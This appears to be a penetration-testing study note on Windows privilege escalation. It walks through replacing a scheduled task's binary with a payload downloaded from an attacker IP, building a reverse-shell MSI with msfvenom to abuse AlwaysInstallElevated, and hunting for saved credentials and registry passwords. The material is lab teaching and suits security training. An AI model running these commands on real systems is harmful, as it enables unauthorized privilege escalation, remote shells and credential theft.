# Quick Wins

## Scheduled Tasks

We should seek interesting information in the _Author_, _TaskName_, _Task To Run_, _Run As User_, and _Next Run Time_ fields. In our case, "interesting" means that the information partially or completely answers one of the three questions above.

{% code title="Display a list of all scheduled tasks" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\steve> schtasks /query /fo LIST /v
...
Folder: \Microsoft
HostName:                             CLIENTWK220
TaskName:                             \Microsoft\CacheCleanup
Next Run Time:                        7/11/2022 2:47:21 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/11/2022 2:46:22 AM
Last Result:                          0
Author:                               CLIENTWK220\daveadmin
Task To Run:                          C:\Users\steve\Pictures\BackendCacheCleanup.exe
Start In:                             C:\Users\steve\Pictures
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          daveadmin
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Minute
Start Time:                           7:37:21 AM
Start Date:                           7/4/2022
...

```
{% endcode %}

{% code title="Display permissions on the executable file BackendCacheCleanup.exe" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\steve> icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
C:\Users\steve\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                BUILTIN\Administrators:(I)(F)
                                                CLIENTWK220\steve:(I)(F)
                                                CLIENTWK220\offsec:(I)(F)
```
{% endcode %}

{% code title="Download and replace executable file BackendCacheCleanup.exe" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\steve> iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe

PS C:\Users\steve> move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak

PS C:\Users\steve> move .\BackendCacheCleanup.exe .\Pictures\
```
{% endcode %}

Scheduled tasks can be listed from the command line using the `schtasks` command, using the task scheduler, or, if possible, uploading a tool such as Autoruns64.exe to the target system.

## AlwaysInstallElevated



Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges if the installation requires administrator privileges.\
This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

\
This method requires two registry values to be set. You can query these from the command line using the commands below.\
\
`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`\
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`\
\
Remember, to be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible.\
If these are set, you can generate a malicious .msi file using `msfvenom`, as seen below.\
\
`msfvenom -p windows/x64/shell_reverse_tcpLHOST=ATTACKING_10.10.200.175 LPORT=LOCAL_PORT -f msi -o malicious.msi`\
\
As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly.\
\
Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell.

Command Run on the Target System

```shell-session
C:\Users\user\Desktop>msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

## Passwords

### Saved credentials

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials.\
`cmdkey /list`\


If you see any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.\
`runas /savecred /user:admin reverse_shell.exe`\


### **Registry keys**

Registry keys potentially containing passwords can be queried using the commands below.\
`reg query HKLM /f password /t REG_SZ /s`\
`reg query HKCU /f password /t REG_SZ /s`\


### **Unattend files**

Unattend.xml files helps system administrators setting up Windows systems. They need to be deleted once the setup is complete but can sometimes be forgotten on the system. What you will find in the unattend.xml file can be different according to the setup that was done. If you can find them on a system, they are worth reading.
